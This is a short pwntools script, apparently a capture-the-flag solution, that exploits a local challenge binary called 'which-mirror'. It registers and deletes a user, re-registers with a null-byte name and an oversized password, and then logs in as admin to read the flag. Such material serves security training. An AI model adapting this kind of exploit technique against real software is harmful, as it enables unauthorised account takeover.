from pwn import *

exe = context.binary = ELF("./which-mirror", checksec=False)
# pty = process.PTY
# p = process(stdin=pty, stdout=pty)
p = process()


def register(mirror: bytes, username: bytes, password: bytes) -> None:
    p.sendlineafter(b"Enter your choice: ", mirror)
    p.sendlineafter(b"Enter username: ", username)
    p.sendlineafter(b"Enter password: ", password)
    p.sendlineafter(b"Enter phone number: ", b"1234567890")


def delete(username: bytes, password: bytes) -> None:
    p.sendlineafter(b"Enter your choice: ", b"3")
    p.sendlineafter(b"Enter username: ", username)
    p.sendlineafter(b"Enter password: ", password)
    p.sendlineafter(b"Enter your choice: ", b"1")


def get_flag(password: bytes) -> str:
    p.sendlineafter(b"Enter your choice: ", b"3")
    p.sendlineafter(b"Enter username: ", b"admin")
    p.sendlineafter(b"Enter password: ", password)
    p.sendlineafter(b"Enter your choice: ", b"2")
    return p.recvline().strip().decode()


register(b"1", b"something", b"admin")
delete(b"something", b"admin")
register(b"2", b"\x00", b"a" * 33)
log.info(get_flag(b"a" * 31))
p.close()
